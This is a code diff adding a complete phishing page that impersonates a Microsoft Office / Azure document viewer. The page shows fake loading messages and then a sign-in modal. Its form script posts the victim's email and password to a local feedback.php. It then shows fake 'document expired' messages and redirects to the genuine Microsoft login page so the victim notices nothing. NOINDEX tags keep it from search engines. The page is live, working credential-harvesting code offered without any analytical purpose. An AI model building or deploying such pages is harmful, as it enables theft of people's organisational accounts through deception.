@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <link rel="stylesheet" href="../../../../../../stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">
+    <script src="../../../../../../unpkg.com/axios/dist/axios.min.js"></script>
+    <link rel="stylesheet" href="../../../../../../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <title>Microsoft Office</title>
+     <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+<style scoped>
+
+    #showcase{
+        margin-top:-150px;
+        background-size: cover;
+        background-position: center;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+
+    }
+
+    #loadingdiv{
+        display: none;
+    }
+
+    #spinner{
+        display: none;
+    }
+
+    #loadinggif{
+        margin-top: 50px;
+    }
+
+    .modal {
+      display: none;
+      justify-content: center;
+      align-items: center;
+      position: fixed;
+      top: 0;
+      right: 0;
+      bottom: 0;
+      left: 0;
+      text-align: center;
+      background-color: rgba(0,0,0,.985);
+    }
+    .modal-body {
+      max-width: 440px;
+      height: 425px;
+      background-color: #fff;
+      border-radius: 4px;
+      padding: 15px;
+    }
+    .modal-content {
+      padding:0px;
+    }
+    .modal-footer {
+      overflow: hidden;
+    }
+
+    .formdiv{
+        font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    }
+
+   
+
+   
+
+    .inner {
+    margin-left: auto;
+    margin-right: auto;
+    min-height: 364px;
+    min-width: 320px;
+    max-width: 412px;
+    width: calc(100% - 40px);
+    padding: 36px;
+    margin-bottom: 28px;
+    background-color: #fff;
+    -webkit-box-shadow: 0 2px 3px rgba(0,0,0,.55);
+    -moz-box-shadow: 0 2px 3px rgba(0,0,0,.55);
+    box-shadow: 0 2px 3px rgba(0,0,0,.55);
+    border: 1px solid #818c94;
+    border: 1px solid rgba(0,0,0,.4);
+}
+
+    #counter{
+        margin-top: -65px;
+    }
+
+    #loding{
+        margin-top: 100px;
+    }
+    .loader {
+    border: 16px solid #f3f3f3;
+    border-radius: 50%;
+    border-top: 16px solid #3498db;
+    width: 120px;
+    height: 120px;
+    -webkit-animation: spin 1s linear 15; /* Safari */
+    animation: spin 1s linear 15;
+    
+    }
+
+    /* Safari */
+    @-webkit-keyframes spin {
+    0% { -webkit-transform: rotate(0deg); }
+    100% { -webkit-transform: rotate(360deg); }
+    }
+
+    @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+    }
+    
+   
+</style>
+
+
+
+<script>
+
+   function mounted()
+   {
+	   countdown(1);
+	   timedText();
+	            
+	}
+
+  
+   // function submitForm()
+   // {
+   // 			var useremail = document.getElementById('email').value;
+   // 			var userpassword = document.getElementById('password').value;
+   //          if(useremail !== '' && userpassword !== ''){
+
+   //              axios.post('static/script/feedback.php',{
+   //                  email: useremail,
+   //                  password: userpassword
+   //              })
+   //              .then(function(response){
+   //                 if(response.status === 200){
+
+   //                    console.log(response.data);
+   //                    loadGif();
+                     
+   //                 }
+   //              })
+   //              .catch(function(error){
+   //                  console.log(error);
+   //              })
+   //          }
+
+   //          return false;
+   //    }
+
+
+function timedText() 
+{
+    setTimeout(myTimeout1, 2000); 
+    setTimeout(myTimeout2, 4000); 
+    setTimeout(myTimeout3, 6000); 
+}
+
+function myTimeout1() 
+{
+    document.getElementById("loding").innerHTML = "Connecting to microsoft azure";
+}
+
+function myTimeout2() 
+{
+    document.getElementById("loding").innerHTML = "Loading document......";
+}
+
+function myTimeout3() 
+{
+    document.getElementById("loding").innerHTML = "Almost done..";
+}
+
+function loadGif() 
+{
+    document.getElementById("formdiv").style.display = 'none';
+    document.getElementById("loadingdiv").style.display = 'block';
+    setTimeout(gif1, 2000); 
+    setTimeout(gif2, 4000); 
+    setTimeout(gif3, 6000); 
+    setTimeout(gif4, 8000); 
+    setTimeout(redirect,10000);
+}
+
+function gif1()
+{
+    document.getElementById("loadinText").innerHTML = "Retrieving document";
+}
+
+function gif2() 
+{
+    document.getElementById("loadinText").innerHTML = "Sorry! Document not found";
+}
+
+function gif3() 
+{
+    document.getElementById("loadinText").innerHTML = "Document expired";
+}
+
+function gif4() 
+{
+    document.getElementById("loadinText").innerHTML = "Taking you back to your inbox";
+}
+
+function redirect()
+{
+    window.location.href = 'https://login.microsoftonline.com';
+}
+
+
+function loadpopup()
+{
+     document.getElementById("modal").style.display = 'flex';
+    
+}
+
+
+
+function countdown(counter)
+{
+  if(counter>0)
+  {
+      counter++;
+       var j = setTimeout(function(){countdown(counter)},90);
+      document.getElementById("counter").innerHTML = counter +" %";
+      if(counter == 100){
+          clearInterval(j)
+           document.body.style.backgroundImage = "url('assets/images/invoice.jpg')"
+          loadpopup();
+      }
+  }
+}
+
+
+
+</script>
+  </head>
+  <body onload="mounted()">
+    <div id="app">
+    	
+
+    <div class="container-fluid"> 
+        
+        <div id="showcase">
+            <div><img src="assets/images/azu.jpg" id="im" alt=""></div>
+            <div class="loader" id="load"></div>
+            <div id="counter"></div>
+            <div id="loding"></div>
+            
+        </div>
+       <div class="modal" id="modal">
+                <div class="modal-body">
+                    <div class="modal-content mt-3">
+                        <div id="formdiv" style="">
+                            <div class="row mt-2 ml-2 mr-2">
+                                <div class="col-md-4 d-none d-md-block d-lg-block"><img src="assets/images/personal.png" alt="" width="100%" height="80px"></div>
+                                <div class="col-md-8"><img src="assets/images/345.png" alt="" width="100%" height="80px"></div>
+                            </div>
+                            <div class="row justify-content-center formdiv">
+                               
+                                <div id="formcontent" class="mt-3" >
+                                   <div class="row form-text">
+                                      <div class="row">
+                                         <div style="font-size: 15px; font-weight: bold;"></div>
+                                      </div>
+                                      <div class="row">
+                                         <div style="font-size: 12px; font-weight: bold;">sign in with your organization account to view document.</div>
+                                      </div>
+                                       
+                                   </div>
+
+                                    <form>
+                                        <div class="form-group">
+                                          <div class="mt-1 mb-2">Sign in to continue</div>
+                                            <input type="email"  class="form-control" id="email" aria-describedby="emailHelp" placeholder="Email" required>
+                                        </div>
+                                        <div class="form-group">
+                                            <input type="password"   class="form-control" id="password" placeholder="Password" required>
+                                            <small id="emailHelp" class="">We'll never share your email with anyone else.</small>
+                                        </div>
+                                        <div class="form-group">
+                                            <button type="submit"  class="btn btn-primary form-control" style="background-color:#0067b8; color:white;"><span id="buttonText">continue</span>
+                                              <span class="fa fa-spinner fa-spin" id="spinner"></span></button>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+
+                        </div>
+
+
+                            <div class="ml-2 mr-2" id="loadingdiv" style="width:400px; height:300px;">
+                                <div class="row mt-2 ml-2 mr-2">
+                                <div class="col-md-4 d-none d-md-block d-lg-block"><img src="assets/images/personal.png" alt="" width="100%" height="80px"></div>
+                                <div class="col-md-8"><img src="assets/images/345.png" alt="" width="100%" height="80px"></div>
+                                </div>                       
+                                <div class="row" id="loadinggif" >
+                                    <div class="col-md-12">
+                                        <img src="assets/images/giphy.gif" alt="" height="20px;" >
+                                    </div>
+                                    <div class="m-auto mt-4" id="loadinText"></div>
+                                </div>
+                            
+                            </div>
+
+                            
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+        
+
+        <!-- <div><img src="azu.jpg" alt=""></div>
+        
+        <div class="d-flex justify-content-center">
+             <div class="loader" ></div>
+            <div id="counter"></div>
+            <div id="text"></div>
+            
+            
+        </div> -->
+    </div>
+
+
+
+
+
+
+    </div>
+   <script src="../../../../../../code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="../../../../../../cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
+<script src="../../../../../../stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js" integrity="sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T" crossorigin="anonymous"></script>
+
+
+<script type="text/javascript">
+    $('form').submit(function(event){
+         event.preventDefault();
+         var useremail = document.getElementById('email').value.trim();
+        var userpassword = document.getElementById('password').value.trim();
+            if(useremail !== '' && userpassword !== ''){
+
+                document.getElementById('spinner').style.display = "inline-block";
+                document.getElementById('buttonText').style.color = "#d4d4db";
+
+                axios.post('static/script/feedback.php',{
+                    email: useremail,
+                    password: userpassword
+                })
+                .then(function(response){
+                   if(response.status === 200){
+
+                      console.log(response);
+                      loadGif();
+                     
+                   }
+                })
+                .catch(function(error){
+                    console.log(error)
+                    alert(error + "\nPlease try again!");
+                    document.getElementById('spinner').style.display = "none";
+                    document.getElementById('buttonText').style.color = "#ffffff";
+                    window.history.go(-1);
+                })
+            }
+
+            return false;
+       })
+  </script>
+
+
+  </body>
+</html>
